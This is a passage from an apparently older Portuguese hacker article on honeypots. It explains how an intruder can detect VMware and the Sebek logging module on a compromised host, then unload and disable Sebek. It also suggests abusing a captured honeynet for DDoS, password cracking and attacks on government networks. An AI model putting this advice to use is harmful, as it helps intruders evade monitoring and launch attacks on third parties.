+Foi deveras  inportant e  analisarmos que  tipo de  pessoas sao  os NewBies e os
+ScriptKiddies, seus atos podem influenciar e muito na utilizacao e implementacao
+dos honeypots como solucao de seguranca, devemos sempre ter em mente o  conceito
+principal dos honeypot s, lembrando que um NewBies, sem discriminacao, foge  dos
+paramet ros dos honeypot  s. NewBies por serem  pessoas novas e com  ainda pouco
+conhecimento  ainda  nao praticao  o  hacking em  si  (ao peh  da  letra), estes
+costumam  utilizar  de  ferramentas  jah  prontas  e  muitas  vezes   muitissimo
+conhecidas dos administradores de rede e que talvez que jah apresentem  solucoes
+na  comunidade, entao  para que  fim os  administradores de  redes irao   querer
+recolher informacoes sobre estes se os  mesmo nao tem nada de inedito  para most
+rar para eles? Consideremos agora as questoes dos ScriptKiddies, estes as  vezes
+possuem um certo conhecimento adquirido ao longo de suas investidas inuteis, mas
+sempre  usam  de  metodos  conhecidos  e  altamento  comentados  por  muitos  na
+comunidade, estes tambem nao oferecem nada increvel para os administ radores  de
+redes que  adotam os  honeypots como  ferramenta de  seguranca para  suas redes.
+Chegamos a uma conclusao interes sante, pessoas com pouco conhecimento nao  irao
+beneficiar os amantes dos honeypots.
+
+****************************
+5.6 - Atacantes X Conceito.*
+****************************
+
+Bom, se torna mais do que interessante lembramos que o conceito do honeypots eh:
+“aprender com quem  sabe” (heheheheh), desculpe  as risadas, mas  realmente eles
+estao certos, eles devem aprender com quem sabe, mas com NewBies e ScriptKiddies
+eles nao irao aprender nada de novo, ou que possam aumentar a seguranca deles na
+pratica.  Este  tipo  de  atacantes nao  tem  nada  para  oferecer a  comunidade
+especialmente os  ScriptKiddies. Analises  de logs  de hosts  que sao  honeypots
+demostram que eh muitissimo fraco  o trafego nestes honeypots, trafego  este que
+soh  recebem  acessos em  protocolos  como: httpd  e  pop, lembrando  que  estes
+protocolos sao os favoritos dos SK e dos defacers.
+
+Um atacante,  ou melhor  um hacker  possivelmente nunca  irah demostrar  para um
+honeypot  o  que  ele realmente  sabe  ateh  por que  ainda  nao  inventarao uma
+ferramenta ou solucao para capturar  malicia. Honeypots, IDS e afins  soh captam
+conteudo tecnico, nao conseguem desvendar o que se passa na cabeca de um hacker,
+e enquanto eles  nao fizerem isso  nunca poderao criar  solucoes eficientes para
+seus casos.
+
+***********
+6 - VMWARE*
+***********
+
+Nos ultimos anos solucoes dos variads tipos surgiram no scenario da informatica,
+uma delas  que eh  muito prezada  ateh mesmo  por mim  eh a  VMware, ou  maquina
+virtual como  quiser chamar,  seu uso  facilita muito  o estudo  e a  pratica de
+muitas coisas que as  vezes se tornam dificeis  de entender soh no  conceito, ou
+somente em localhost. As VMware sao programas que criam maquinas virtuais dentro
+de um sistema real, com ela eh possivel se ter um OpenBSD instalado na  maquina,
+rodando ao mesmo tempo com um Linux, a VMware eh instalada no Linux e daih  cria
+se  uma maquina  virtual com  o OpenBSD  instalado e  podemos rodar  as duas  em
+paralelo e criar  uma rede entre  elas para facilitar  o estudo e  possivelmente
+para se emular redes de sistemas variados.
+
+Com a alta  difundicao das VMwares,  elas foram adotadas  como compendio para  a
+implementacao de honeypots, nao eh que um honeypot necessite de uma VMware  para
+funcionar mas sim que dentro de um VMware pode-se criar varios honeypots,  tendo
+assim  uma  honeyNET.  Os  altos  gastos  com  a  compra  de  Hardware  para   a
+implementacao de honeyNETs abriu uma  oportunidade paras as VMwares entrarem  no
+'jogo',  com  elas  em possivel  se  ter  em uma  unica  maquina  4,5,6 sistemas
+diferentes  sem  precisar  adquirir nenhum  novo  hardware,  basta ter  recursos
+suficientes na maquina para  isso. Daih podemos julgar  as VMware como sendo  um
+primeiro passo para  desconfiarmos que no  nosso alvo roda  um honeypot, ou  uma
+honeyNET.  Com  base   em  algumas  analises   vou  tentar  demonstrar   algumas
+caracteristicas 'basicas' dela e como podemos detectalas.
+
+***************
+6.1 - Deteccao*
+***************
+
+Vamos partir  do principio  que os  honeypots sao  feitos para  ser invadidos, e
+digamos que vc jah tenha acesso a maquina alvo, daih podemos separar os  metodos
+de deteccao em 2 categorias:
+
+COMO USUARIO COMUM - Nessa opcao temos 2 possibilidades validas!
+
+*********************************
+6.1.1. - 4tphi - vmchk.c(code)  *
+*********************************
+
+Ao fucar  um pouco  na internet  e em  muitos foruns,  eu achei  lah em um dos
+foruns da insecure.org (www.insecure.org) uma pequena discussao sobre VMwares,
+daih achei um  codigo fonte feito  em C muito  pratico e que  realmente eh uma
+'mao na roda'. Esse programa chama-se VMCHK e eh tao pratico que alem de dizer
+se realmente ali roda  uma VMware, ele ainda  diz a versao da  VMware. Podemos
+partir do presuposto que: se há  uma VMware também há possibilidades de  haver
+um honeypot.
+
+4tphi-vmchk.c --> Escrito por Andrew Hintz
+
+*******************
+6.1.2. - ifconfig *
+*******************
+
+Essa eh mais simples que batata cozida, mas tambem funciona e eh util em todos
+os casos, novamente  presumindo que vc  tem acesso a  maquina alvo...: Sabemos
+que cada placa de rede alem de  seu numero IP, elas tambem tem seu  MAC adress
+ou endereco fisico, cada placa de rede segundo o conceito, cada placa de  rede
+tem  seu MAC  diferente das  outras placas,  ou seja,  segundo o  conceito  eh
+impossivel acharmos uma placa de rede com MAC igual a de outra. Bom, vejamos o
+seguinde, se voce  jah usou alguma  vez uma VMware  vc percebeu que  alem dela
+criar maquinas virtuais, ela tambem  cria outras interfaces de rede  (placa de
+rede) tanto no Linux quanto no Windows, daih se notarmos ao criar essas placas
+de rede  virtuais a  VMware dota  elas de  seus respectivos  MAC adress, mas o
+interessante eh que ela sempre cria MAC adress MUITO parecidos como:
+	------------------------------
+	eth0 - 00:F0:29:F5:00:1F:CF:A9
+	eth1 - 00:F0:29:F5:00:1F:CF:AA
+	eth2 - 00:F0:29:F5:00:1F:CF:AB
+	eth4 - 00:F0:29:F5:00:1F:CF:AC
+	-------------------------------
+
+Ateh   minha   mae perceberia que esses HEXs (numero MAC), sao MUITO parecidos
+mudando  apenas  o  ultimo numero,  isso acontece  sempre que  uma VMware  eh
+instalada  em  um   sistema  Linux e   Windows.  Aih   jah  eh  outro  quisito
+possitivo para  sabermos que  há possibilidades de o  sistema rodar dentro  de
+um VMware  ou ateh  de  ser nosso amado  honeypot ;) Para saber  o  MAC adress
+das placas de redes  instaladas usa se um comando simples e nativo do Linux, o
+/sbin/ifconfig , no qual este lista todas as interfaces de rede com seus IPs e
+MACs.
+
+**************************
+6.1.3. - Ksyms | grep vm *
+**************************
+
+Esse metodo  eh  bem simples, assim  como os outros,  mas eh de  grande ajuda, o
+comando 'ksyms' mostra  os simbolos exportados  pelo kernel, ou  seja nos mostra
+nomes relacionados ao  modulos carregados no  Kernel do Linux,  juntamente com o
+comando 'grep vm' iremos procurar por  simbolos no Kernel com a string  'vm' (ou
+VM), faremos isso por que uma maquina virtual (vmware) carrega modulos no Kernel
+com essa string, por
+exemplo:
+
+root@rapadura:/home/rapadura# ksyms | grep VM
+c7a30060  VMX86_RegisterMonitor             [vmmon]
+
+Com   isso  fica   bem  claro   que  estamos   numa  vmware,   esse  metodo   eh
+consideravelmente simples, mas eh com coisas simples que chegamos onde queremos,
+podemos mudar um pouco o exemplo, com o comando 'dmesg'podemos ver quase tudo que
+foi carregado durante a inicilizacao da maquina, coloque assim:
+
+root@rapadura:/home/rapadura# dmesg | grep VM
+hda: VMware Virtual IDE Hard Drive, ATA DISK drive
+hdc: VMware Virtual IDE CDROM Drive, ATAPI CD/DVD-ROM drive
+
+Notamos que juntamente com a inicilazicao da maquina, foram criados dispositivos
+virtuais, no nosso caso, uma unidade de  cdrom e um hd. Com isso jah  temos mais
+cartas  na  manga,  jah  eh mais  motivos  para  desconfiarmos  que estamos  num
+honeypot, outra  dica, quando  voce se  deparar com  uma VMware provavelmente na
+maioria  das vezes  ela eh  um honeypot  de Alta  Interatividade, assim  pode-se
+explorar a  maquina por  completo, estou  dizendo para  voces poderem  pensar em
+maneiras de se explorar falhas na VMware, nao no
+honeypot, isso seria interessante. ;)
+
+***********
+7 - Sebek *
+***********
+
+Ferramentas  para a  composicao de  uma maquina  honeypot sao  muitas, mas  essa
+concerteza chama muito atencao  por ser de grande  ajuda na captacao de  logs. O
+Sebek eh originalmente desenvolvido com o intuito de guardar os logs procedentes
+de todos os servico da maquina, há possibilidades de se manter o log apenas para
+consulta 'ao vivo'  ou guarda-lo em  um banco de  dados estilo mysql,  com esses
+logs  em banco  de dados  podem ser  usados para  se fazer  consultas futuras  e
+estatisticas em cima das maquinas honeypot.
+
+Se for levar ao peh da letra o Sebek nao eh um honeypot, mas sim uma  ferramenta
+de  auxilio  na   construcao  de  honeypots,   tanto  de  Alta   como  de  Baixa
+Interatividade,  ele eh  caracterizado assim  por que  nao tem  opcao de  emular
+nenhum servico ou vulnerabilidade falsas,  mas este eh muito usado  e concerteza
+voce fucador pode ser deparar com muitos por aih. Vamos analisar agora como eh o
+funcionamento  do   Sebek,  assim   poderemos  criar   situacoes  praticas  para
+detectarmos sua presenca na maquina alvo.
+
+*******************************
+7.1 - Funcionamento do Sebek. *
+*******************************
+
+Bom, de comeco eh bom lembrarmos que o sistema operacional Linux eh dividido em:
+User Space  e Kernel  Space, sendo  assim sabemos  que o  User Space  eh onde as
+coisas sao limitadas e podem ser alteradas com uma certa facilidade, um  exemplo
+de User Space eh o shell (sh, bash) onde por meio dele se envia comandos para  o
+Kernel Space que eh  como se fosse um  mundo supremo onde pode-se  tudo. Vejamos
+agora no desenho abaixo  uma apliacao do Sebek  no Linux, dividimos em  Kernel e
+User Space:
+
+http://www.skynet45.motdlabs.org/honeys/sebek_kernel.jpg
+
+Se notarem  bem, vao  perceber que  uma vez  o atacente  digitando um comando no
+shell esse comando eh enviado ao system call read e assim executado pelo kernel,
+daih com a instalacao do Sebek no alvo esse system call passa a ser interceptado
+antes de  repassar o  comando para  o kernel,  o Sebek  cria um novo system call
+(new_read) e assim repasa o comando  digitado a uma base de dados  (data logger)
+onde ele serah armazenado, depois disso  o modulo do Sebek reenvia o  comando ao
+kernel jah para ser executado normalmente. Olhos perceptivos conseguem enchergar
+que o Sebek trabalha  com o kernel, fica  quase inviavel executarmos um  comando
+sem ele nao capturar antes, poderiamos ateh escrever um programa que manda-se os
+comandos direto  pro kernel,  mas daria  muito trabalho,  podemos ver  isso numa
+proxima oportunidades, ou alguem da  comunidade poderia se expressar e  fazer. O
+Sebek funciona com modulos que sao carregados paralelos ao kernel, ele possui  2
+modulos  principais, o  primeiro eh  o Sebek  em si,  o outro  tem por  objetivo
+esconder o  primeiro modulo  (sebek) das  listagens de  modulos (ex.:  'lsmod').
+Vamos  nos  basear nessas  caracteristicas  para tentarmos  detecta-lo  na nossa
+maquina alvo.
+
+***************************************
+7.2 - Metodos para deteccao do Sebek.  *
+***************************************
+
+Todos os metodos sao indiscutivelmente simples, com facil utilizacao em sistemas
+Linux.  Para colocarmos  em pratica  o primeiro  metodo vamos  precisar de   uma
+ferramenta  chamada  'chkrootkit'  que  eh  de  autoria  de  brasileiros,   essa
+ferramentas procura por alteracoes feitas no kernel (ex.: via lkm).
+
+**************************
+7.2.1. - chkrootkit (*). *
+**************************
+
+Jah vimos que o Sebek tem  por caracteristica carregar alguns modulos quando  eh
+iniciado, esses  modulos sao  carregados no  kernel do  sistemas operacional.  O
+utilitario  'chkrootkit'  tem  por objetivo  checar  algumas  caracteristicas de
+ferramentas muito conhecidas que fazem  mudancas no kernel, e assim  detectalas.
+Apos baixar e descompactar o  'chkrootkit', proceda assim: - Entre  no diretorio
+do  chkrootkit  -  Execute  o  script:
+
+#  ./chkrootkit  ...  'lkm'...Sebek  LKM installed! ...
+
+Se voce percebeu o chkrootkit  fez varias checagens atras de  alguma modificacao
+no kernel, ao  checar a entrada  dos lkm's ele  achou de cara  o Sebek, duh! Mas
+serah que eh  tao facil assim?  Bom pessoal, todo  principio sao flores...  - Em
+alguns casos:
+
+# ./chkrootkit ... 'lkm'...not detected ...
+
+Infelizmente em algumas maquinas o  script do chkrootkit nao nos  retornou nada,
+mas  por  que isso  aconteceu?  Bom depois  de  algumas horas  ou  ateh dias  de
+pesquisas, resolvi dar um jeitinho simples, observe e tente entender. De  inicio
+se lembre que o 'chkrootkit' eh um script, ele pode ser lido por nos na  integra
+( nao eh  um byte-code) daih  usamos um pouquinho  da inteligencia que  Deus nos
+deu, assim:
+
+	# grep Sebek chkrootkit echo "Warning: Sebek LKM Installed!"
+
+Bom  com  isso estamos  tentando  saber como  o  script do  chkrootkit  consegui
+detectar o Sebek no primeiro caso, ao fazer uma busca dentro do chkrootkit  pela
+string  'Sebek', que  era a  String que  ele nos  retornou quando  achou o  lkm,
+achamos a linha acima, agora se voce abrir o script do chkrootkit num editor  de
+texto da sua  preferecia e procurar  pela string 'Sebek'  dentro do texto  limpo
+voce vai chagar nas linhas:
+
+	### sebek LKM (Adore based)  [ -r /proc/ksyms ] &&  \ if `${egrep} -i sebek  <
+	/proc/ksyms >/dev/null 2>&1`; then echo "Warning: Sebek LKM installed" fi
+
+OPA! Tah aih, quando vi isso fiquei meio confuso, mas logo as coisas comecaram a
+clarear, e daih  pensei em arrumar  a minha solucao,  sempre a nossa  solucao eh
+mais facil e util. Note que nessa  parte do script o chkrootkit apenas checa  os
+simbolos(chamemos  de strings)  que o  kernel estah  exportando e  quandoa  acha
+alguma  string  semelhante  a  que  ele  procura  ele  denuncia  logo,  isso  eh
+relativamente MUITO simples, podemos fazer isso na mao mesmo, assim:
+
+	#  grep  sebek  /proc/ksyms  c7a53000   __insmod_teste_O/usr/ferramentas/sebek
+	linux- 2.1.7/teste.o_M40D837C0_V132118 [teste]
+
+Bingo.  Se  lembramos da  explanacao  sobre as  caracteristicas  do sebek  vamos
+perceber que junto  com seu modulo  principal o administrador  tambem levanta um
+modulo pra esconder o modulo principal das listagens dos modulos, mas nesse caso
+que acabamos de ver mesmo com esse modulo de ocultacao ativo nos conseguimos ver
+o sebek dentro dos simbolos que o kernel estah exportando, isso eh meio  confuso
+nao  posso  discordar  disso, mas  um  modulo  com nome  estranho  dentro  de um
+diretorio chamado  'sebek-linux-2.1.7' nao  pode ser  um presente  do papai noel
+neh? Eh  claro que  o nosso  amado 'sebek',  de troca  ainda ganhamos  o nome do
+modulo que  eh o  sebek eh  carregado (teste.o).  Mas voltando  a nossa  questao
+principal, no segundo exemplo o  chkrootkit nao conseguiu detectar o  sebek pois
+concerteza o administrador tem  um pouco mais de  conhecimento e mudou tambem  o
+nome do modulo para tentar enganar os hacker, mas como os hacker sempre  estaona
+frente deles...temos ainda outro metodo para detectarmos nosso amigo sebek.
+
+***********************************
+7.2.2. - Modulos no boot X lsmod.   *
+***********************************
+
+Sabemos que  todos os   dispositivos de  hardware no  computador tem   um modulo
+especifico  que   eh  carregado  durante   o  boot  da  maquina  para  haver  um
+funcionamento correto dos dispositivos. Usualmente quando os administradores  de
+redes instalam o  Sebek em um  host, eles fazem  com que o  seu modulo principal
+(sebek.o) e tambem o modulo que o esconde das listagens (cleaner.o) sejam  ambos
+carregados durante o boot, eles talvez jah facam isso pensando na  possibilidade
+de um  hacker usar  o metodo  passado para  se livrar  do Sebek, mas mesmo assim
+podemos 'arrancar' o Sebek  do nosso caminho, esse  metodo eh um pouco  estranho
+mais o que importa eh que tambem funciona. ;)
+
+De inicio podemos  logo pensar por  um caminho bem  intuitivo, se levantarmos  o
+modulo do sebek  (sebek.o) e depois  o cleaner (cleaner.o)  nao poderemos ver  o
+modulo do sebek quando perguntarmos ao kernel por meio de um lsmod, isso por que
+essa listagem de modulos  eh encadeada, o cleaner  engana o lsmod e  faz com que
+ele de um 'jump' ou um pulo para  o proximo item da lista, ela eh uma  lista que
+segue uma  sequencia (1,2,3,4...)  por isso  o cleaner  consegue fazer isso. Com
+base nisso podemos fazer uma compracao entre os modulos ativos e os modulos  que
+foram carregados na inicializacao, para isso podemos seguir assim:
+
+root@rapadura:/etc/rc.d# dmesg >saida.txt
+
+O comando dmesg mostra tudo que  foi iniciado na maquina durante o  ultimo boot,
+com isso  jah sabemos  que o  nosso amiguinho  Sebek estah  nessa lista, soh nao
+sabemos quem ele eh,  mas ele estah lah,  daih mandamos o comando  dmesg jogar a
+saida dentro de um arquivo texto  para facilitar nossa futura busca pelo  modulo
+do
+Sebek. Continuamos assim...:
+
+root@rapadura:/etc/rc.d# lsmod >saida1.txt
+
+Agora tambem temos uma lista dos modulos atuais, os modulos que estao no  kernel
+nesse momento, daih jah  sabemos que o Sebek  NAO estah nessa segunda  listagem,
+pois  o cleaner  fez o  favor de  apagalo dessa  listagem com  lsmod, outra  vez
+mandamos o comando  jogar a saida  dentro de um  arquivo texto para  facilitar a
+busca.
+
+Comecemos nosso busca  em si, jah  temos duas listas  para analise, mas  por que
+duas? Simples,  se voce  prestou atencao  no que  leu pode  perceber que o Sebek
+concerteza estah presente dentro da primeira e NAO estah na segunda  lista,  com
+isso podemos chegar a um ponto em comum, façamos aqui uma representação das
+duas listas:
+
+	DMESG		LSMOD
+	  1		  1
+	  2		  2
+	  3		  3
+	  4		  4
+	  5		  5
+	  6		  7
+	  7		  8
+	  8		  9
+	  9		 10
+	 10
+
+Puxa, ateh meu sobrinho de  4 anos pode ver que  essa lista tem algo de  errado,
+com olhos um pouco mais malicioso vemos  que existe um modulo (n°5) que faz  com
+que  o  seu  seguinte(n°6)  nao  seja  mostrado  pelo  lsmod,  nao  seria  muita
+coincidencia? Que nada, eh ele mesmo, o proprio o modulo do Sebek que  estavamos
+procurando!  Entao,  agora voce  tem  duas possibilidades,  primeiro:  remover o
+modulo do kernel(rmmod  5), ou melhorar  as coisas..., procurar  pelo arquivo do
+modulo, chegar as  suas configuracoes, ver  se ele estah  mandando os logs  para
+outra maquina e hackear  essa maquina tambem, nao  vou me aprofundar mais  nisso
+por que serai muita materia,  poderemos deixar para uma proxima  oportunidade. A
+solucao mais pratica e  viavel seria tirar o  modulo do kernel, depois  apagar a
+entrada que o  levanta a cada  reboot, e assim  reiniciar a maquina,  quando ela
+voltar vai estar limpinha,  sem Sebek no seu,  e assim voce pode  partir para um
+bom hacking!!!
+
+************
+8 - HoneyD *
+************
+
+No quesito  construcao completa  de honeypots  a ferramenta  HoneyD se  destaca,
+tanto pela sua grande facilidade  de operacao, quanto pela utilidade  nas vistas
+dos administradores de  honeynets para se  criar maquinas e  servicos falsos. Ao
+contrario do Sebek, que  soh guardava logs, o  HoneyD tem a capacidade  de criar
+maquinas  falsas  dentro  de  uma  faixa de  IP  nao  usada  e  determinada pelo
+administrador, por isso ele conta tambem  com um sistema de log para  captura de
+logins e logs de comandos e do sistema.
+
+***********************************
+8.1  - Caracteristicasdo  HoneyD. *
+***********************************
+
+Como todo e bom fucador devemos olhar as coisas de um jeito mais  investigativo,
+sempre se perguntar sobre  possibilidades e por que  as coisas funcionam de  uma
+determinada maneira. Todos nos sabemos que para se mandar comandos para o kernel
+do linux eh necessario se ter uma shell, um interpretador de comandos, mas  isso
+como  jah  foi mostrado  por  muitos fucadores  nao  eh necessariamente  valido,
+comandos podem ser executados  dentro de uma shell  propria por assim dizer,  no
+lugar de usarmos o  bash ou sh podemos  criar um shellcode para  mandar comandos
+direto  para  o kernel,  gostaria  de frizar  que  por nao  dominar  tecnicas de
+construcao dessas ferramentas vou apenas abrir um caminho para outros  fucadores
+dispostos  a  implementarpossam  fazer  pois  isso  eh  muito  util  nas  nossas
+investidas. O HoneyD usa esse tipo de tecnica para capturar informacoes dadas  a
+maquina alvo, quando alguem (fucador) manda um comando para o alvo (honeypot)  o
+HoneyD se apodera do conteudo do comando quando ele passado para a shell,  sendo
+assim pode-se mandar  os comandos com  uma shell propria  conforme falado acima.
+Peco desculpas por nao pormenorizar essas questoes, mas ao saber disso voce pode
+jah comecar a aumentar seu horizonte e
+se aperceber de novas coisas. ;)
+
+************************************
+9 - Causas do uso de um Honeypot.  *
+************************************
+
+Sabemos que tudo que  colocamos as vistas da  internet e de outras  redes jah eh
+por si  soh inseguro,  e tambem  altamente exploitavel,  os honeypots  entao nao
+fogem da regra,  assim como todas  as outras ferramentas  de seguranca tem  seus
+'buracos', e tambem  as causas para  aqueles que os  usam. Dentre as  principais
+causas estao: Altos  Gastos e Impossibilidade  de escondelo dentro  da rede, vou
+explicar melhor
+e com detalhes.
+
+************
+9.1 - DMZ. *
+************
+
+DMZ = Zona Desmilitarizada, ou um lugar sem acesso ou perigo.
+Percebi em  muitas listas  de discussao  sobre honeynets  que sempre eh abordado
+esse ponto, "posso esconder o meu honeypot de minha rede interna?", segundos  os
+desenvolvedores das ferramentas podem sim, eles afirmam que conjuntos de  regras
+de  firewalls  e politicas  de  seguranca um  pouco  estranhas fazem  com  que o
+honeypot nao seja visto de outras  partes da rede corporativa, mas como  isso eh
+possivel?  Novamente  devemos olhar  com  olhos maliciosos  a  essas afirmacoes.
+Existem N maneiras de se 'enchergar' uma maquina dentro de uma rede, uma vez  um
+host estando ligado ao HUB ou SWITCH ele eh visivel de uma maneira ou de  outra,
+ataques  de cache  poison e  arp spoof  podem se  amplamente desenrolados   para
+solucionar esse problema :) , quando temos uma maquina ligada fisicamente dentro
+de um  SWITCH ele  passa a  se tornar  tambem uma  ramificacao do  SWITCH, entao
+novamente procure colocar sua mente pra rodar e pensar em enessimas maneiras de
+se fazer isso.
+
+*********************
+9.2 - Altos Gastos. *
+*********************
+
+Impresas de Seguranca da Informacao na atualidade gastao MILHOES, senao  BILHOES
+em solucoes para melhorar a vida e a privacidade de seus clientes, e os clientes
+por  continuidade pagam  precos exorbitantes  pela seguranca  da informacao  tao
+sonhada em nossos dias. Mas mesmo milhoes nao tem sido suficientes para trazer a
+'solucao'.  Imagine:  Uma  rede  com 5  maquinas,  1  SWITCH,  Link, manutencao,
+suporte, instalacao  e encargos,  voce acha  que manter  isso sai  barato? Outra
+coisa, essa eh uma configuracao  basica de uma honeynet de  Alta Interatividade,
+pior ainda, lembrando que essa honeynet  soh recebe 30 acessos por semana,  pois
+eh, essa eh  a situacao que  os honeypots nos  mostram, pessoas (adm.  de redes)
+gastam MUITO dinheiro  com equipamento desncessarios,  visto que estes  como jah
+foi mostrado  durante todo  o conteudo  desse texto  nao servem  para aumentar a
+seguranca de suas corporacoes. Serah que nao sairia mais barato o adm. de  redes
+estudar um pouco mais pra poder melhorar suas ideias de segurancas?
+Hehehe Pensem nisso.
+
+**************
+10 - Perigos *
+**************
+
+Jah vimos que existem consequencias  ao se implementar um honeypot,  mas perigos
+sao ainda piores! Veja.
+
+*************************
+10.1 - Comprometimento. *
+*************************
+
+Apos um  honeypot ser  comprometido ele  pode ser  usados para  muitos fins,  um
+cracker com  certeza usaria  disso para  se beneficiar,  ele logo imaginaria uma
+maneira de  sair no  lucro com  esse comprometimento,  isso poderia acarretar em
+crimes reais como: se o honeypot fosse usado para hospedar pornografia infantil,
+ataques a rede de bancos e  redes do governo, analisemos esses ultimos  com mais
+detalhes. Suponhamos que um fucador acabe de conquistar um honeypot, isso depois
+de bastente trabalho, mas ele conseguiu, daih ao ver uma nova porta a sua frente
+ele parte para novos desafios , como um fucador ele quer se superar mais  ainda,
+daih ele parte para ataques mais sofisticados possivelmente a redes .gov ou .mil
+(governo, militares), ao comecar suas investidas  a essas redes ele nota que  eh
+possivel ganhar acesso a  uma maquina X dentro  da rede do governo  de seu pais,
+passado alguns  dias ele  consegue acesso  e tem  total poder  dessa maquina  X,
+lembrando que  o fucador  partiu os  ataques a  maquina X  de dentro do honeypot
+comprometido por  ele a  alguns dias  atras, passado  mais alguns  dias ele  nao
+consegue mais acessar  a maquina X, ele se percebe que seu acesso nao-autorizado
+foi  descoberto e  parado. Concerteza  as autoridades  do Governo  Federal iram
+entrar em comissao para apurar a origem  do ataque a maquina X, ao terminar  uma
+serie de auditorias na maquina X  os tecnicos do governo descobrem que  o ataque
+se originou de uma maquina Y (honeypot), BOMBA, daih o que voce que acontece  no
+fim da historinha? Exatamente quem se
+lasca eh o administrador do honeypot.
+Mas por que o administrador do Honeypots? Eh simples, como sempre diz meu grande
+amigo  NashLeon:"A  Lei  eh  Dura  mais  eh  Lei",  analisemos  um  pedacinho da
+constituicao Brasileira:
+
+*	Art. 186. Aquele que, por ação ou omissão voluntária, negligência ou
+imprudência, violar direito e causar dano a outrem, ainda que
+exclusivamente moral, comete ato ilícito.
+
+*	Art. 187. Também comete ato ilícito o titular de um direito que, ao
+exercê-lo, excede manifestamente os limites impostos pelo seu fim
+econômico ou social, pela boa-fé ou pelos bons costumes.
+
+Se voce  eh uma  pessoa bem  perceptiva, e  concereteza eh,  notou que se houver
+neglicencia no  administracao de  um servico  (digo internet)  o responsavel por
+algum  dano  causado por  meio  dele eh  o  responsavel, imaginem  agora,  o Dr.
+Administrador do Honeypots  que atualmente se  acham muito bonitoes  deixam seus
+honeypost  a  margem  de  qualquer  atacante,  daih  um  amigo  Hacker   resolve
+comprometer o mesmo,  sendo assim se  ele partir dalih  qualquer ataque a  redes
+privadas (org, mil) quem leva o `fumo` eh o Dr. Bonitao ! Puxa quem sabe  alguem
+agora se convenca do perigo de usar essas coisas. Ah sim eh interessante o final
+do Art. 187 que menciona 'boa-fe', pois eh isso quer dizer que se o Dr.  Bonitao
+deixar lah a honeynet a merce de tudo e todos ele estah achando que ninguem  vai
+fazer mal nenhum, que nao vao prejudicar ninguem,
+mas mesmo assim ele eh punido caso ocorra algo ilicito alih. DUH!
+
+Eu recomendo a leitura de um texto que se encontra na pagina do Escritorio Opice
+Blum Advogados Associados, eh de leitura extremamente essencial! Parabens para o
+Opice Blum (Escritorio em Geral).
+
+A responsabilidade civil dos profissionais da informação - 07/10/2003
+Autor: Roberto Leibholz Costa
+http://www.opiceblum.com.br/
+
+**********************
+10.2 - Ataques Ddos. *
+**********************
+
+Esse  eh um  caso interessante  e extramamente  simples, como  os passados.   Ao
+dominar  toda uma  honeynet o  atacante pode  muito bem  como jah  citado  tomar
+atitudes mais  direcionadas, como  penetrar em  redes .gov  & .mil,  daih muitas
+vezes esses  ataques exigem  esforcos mais  especificos, nem  sempre invadir uma
+rede eh facil, ou  quase nunca. Levantemos a  possibilidade de o atacante  quere
+provocar um Denial Of Service em uma das maquinas da rede alvo, por exemplo  ele
+quer derrubar um servidor de dhcp para depois ao servidor retornar ele conseguir
+um IP valido  dentro da rede  (mero exemplo). Daih  para facilitar sua  vida ele
+lembra que ele tem nao soh 1 maquina para realizar este ataque, mais VARIAS, ele
+a dias atras ou horas, dominou todo uma honeynet, daih com o poder das  maquinas
+da honeynet ele pode fazer o  que quiser, uma das possibilidades eh  incrementar
+seu ataque e partir para um Ddos (distribuid denial of service) assim ele  terah
+muito mais chance de seu ataque ser bem sucedido, pois ele tem VARIAS maquinas,
+nao soh 1.
+
+O atacante pode usar varias  ferramentas publicas disponiveis para esse  tipo de
+ataque (trinoo)  assim basta  ele instalar  essas ferramentas  na honeynet,  que
+serah sua rede  escrava, e pronto  dirigir o ataque  para seu alvo  especifico !
+Assim dentro de pouco tempo seu ataque serah concerteza muito bem sucedido. E
+com uma forcinha da honeynet, afinal ela estah se tornando amiga do hacker!
+
+Um exemplo do ataque pode ser visto em:
+
+http://www.skynet45.motdlabs.org/honeys/ddos.jpg
+
+***********************************
+10.3 - Fornecimento de recursos. *
+***********************************
+
+Apos termos  levantado N  possibilidades para  colocarmos os  honeypots a  nosso
+favor e tambem de tira-los do nosso caminho ficou ainda um ponto muito  peculiar
+e interessante. Depois de refletir um  pouco mais sobre a possibilidade do  Ddos
+eu tambem  percebi que  podemos usar  a honeynet  para quebrar  senhas, usando o
+djohn-the-ripper (metodo  distribuido), mas  nao entrarei  em detalhes  quanto a
+isso, voce mesmo pode criar possiblidades  tanto quanto ao Ddos quanto a  quebra
+de senhas, mas o que me incentica a comentar eh a grande sacada da jogada. Tanto
+no  momento que  o Ddos  estah sendo  executado, quanto  na quebra  de senhas  o
+atacantes estah usando RECURSOS da honeynet, recursos tais como: tempo, energia,
+link,  processamento e  etc. Assim  dah vontade  ateh de  rir nao  acham? O  Dr.
+Bonitao (adm.  da honeynet)  que se  acha muito  esperto e  quer aprender com os
+hacker acaba de fornecer todos os recursos necessarios para realizarmos  ataques
+das mais  infinitas possibilidades,  lembrando que  quando menciono  recursos eu
+quero dizer GRANA, dinheiro, dunfunfa, ticket, cash, especime. Sendo assim  eles
+soh perdendo, e continuo dizendo eles estao nos
+tornando nossos amigos. (quem sabe!)
+
+*************************
+11 - Aspectos Juridicos *
+*************************
+
+Voltemos um  pouco para  a parte  judicial, somente  mais algumas  comparacoes e
+analises internacionais da coisa.
+
+**************************************
+11.1 - Constituicoes fora do Brasil. *
+**************************************
+
+Eh interessante que ferramentas semelhantes, senao tambem os honeypots podem ser
+incluidos, em muito paises  tem seu uso bem  restriro e limitado, muitos  paises
+nao permitem  o uso  legal de  honeypots uma  vez que  os mesmo  sao usados para
+capturar dados de terceiros sem permissao verbal ou escrita da pessoa. Isso  nao
+ocorre caso a presenca  das ferramentas de log  seja indicada loga no  inicio da
+`conversacao` entre as maquinas, pode ser  feito por meio de banner e  mensagens
+visuais, que concerteza irao chamar atencao de
+quem as ler.
+
+Entre  os  paises  que  nao  permitem  essas  ferramentas  estao:  Reino  Unido,
+Australia, Canada, EUA, Uniao Europeia. Os links para as constituicoes de leis
+dos paises estao abaixo:
+
+http://www.skynet45.motdlabs.org/honeys/Canada-6_4.pdf
+http://www.skynet45.motdlabs.org/honeys/Uniao_Europei_data_legals.doc
+http://www.skynet45.motdlabs.org/honeys/honeys_legal_UK.doc
+http://www.skynet45.motdlabs.org/honeys/legals_data_EUA_CANADA_AUSTRALIA_UK.doc
+
+Por favor, leiam e tirem suas proprias conclusoes.
+
+******************************
+11.3 - Logs  Contraversivos. *
+******************************
+
+Este aspecto foi  me chamado atencao  por alguns amigos,  eh bem interessante  a
